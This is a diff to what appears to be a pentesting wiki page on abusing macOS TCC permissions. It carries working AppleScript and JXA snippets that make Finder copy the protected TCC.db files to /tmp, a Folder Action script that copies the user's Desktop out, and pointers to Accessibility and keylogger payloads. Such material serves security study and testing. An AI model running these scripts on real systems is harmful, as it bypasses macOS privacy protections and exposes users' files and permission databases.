@@ -350,6 +350,14 @@ INSERT INTO access (
 
 </details>
 
+### TCC Payloads
+
+If you managed to get inside an app with some TCC permissions check the following page with TCC payloads to abuse them:
+
+{% content-ref url="macos-tcc-payloads.md" %}
+[macos-tcc-payloads.md](macos-tcc-payloads.md)
+{% endcontent-ref %}
+
 ### Automation (Finder) to FDA\*
 
 The TCC name of the Automation permission is: **`kTCCServiceAppleEvents`**\
@@ -367,12 +375,7 @@ tell application "Finder"
     set homeFolder to path to home folder as string
     set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
     set targetFolder to POSIX file "/tmp" as alias
-
-    try
-        duplicate file sourceFile to targetFolder with replacing
-    on error errMsg
-        display dialog "Error: " & errMsg
-    end try
+    duplicate file sourceFile to targetFolder with replacing
 end tell
 EOD
 ```
@@ -384,12 +387,7 @@ osascript<<EOD
 tell application "Finder"
     set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
     set targetFolder to POSIX file "/tmp" as alias
-
-    try
-        duplicate file sourceFile to targetFolder with replacing
-    on error errMsg
-        display dialog "Error: " & errMsg
-    end try
+    duplicate file sourceFile to targetFolder with replacing
 end tell
 EOD
 ```
@@ -442,14 +440,14 @@ Same happens with **Script Editor app,** it can control Finder, but using an App
 
 ### Automation (SE) to some TCC
 
-System Events can create Folder Actions, and Folder actions can access some TCC folders, so a script like the following one can be used to abuse this behavour:
+**System Events can create Folder Actions, and Folder actions can access some TCC folders** (Desktop, Documents & Downloads), so a script like the following one can be used to abuse this behaviour:
 
 ```bash
 # Create script to execute with the action
 cat > "/tmp/script.js" <<EOD
 var app = Application.currentApplication();
 app.includeStandardAdditions = true;
-app.doShellScript("/Applications/iTerm.app/Contents/MacOS/iTerm2");
+app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
 EOD
 
 osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"
@@ -481,11 +479,12 @@ tell application "System Events"
 end tell
 EOD
 
-# Open the folder, this won't be enough, but just getting out of it, or getting it is enough to trigger the folder action script
-open "$HOME/Desktop"
+# File operations in the folder should trigger the Folder Action
+touch "$HOME/Desktop/file"
+rm "$HOME/Desktop/file"
 ```
 
-### Automation (SE) + Accessibility (**`kTCCServicePostEvent`)** to FDA\*
+### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*
 
 Automation on **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) allows to send **keystrokes to processes**. This way you could abuse Finder to change the users TCC.db or to give FDA to an arbitrary app (although password might be prompted for this).
 
@@ -536,6 +535,10 @@ tell application "System Events"
 end tell
 EOF
 ```
+
+### `kTCCServiceAccessibility` to FDA\*
+
+Check this page for some [**payloads to abuse the Accessibility permissions**](macos-tcc-payloads.md#accessibility) to privesc to FDA\* or run a keylogger for example.
 
 ### **Endpoint Security Client to FDA**
 
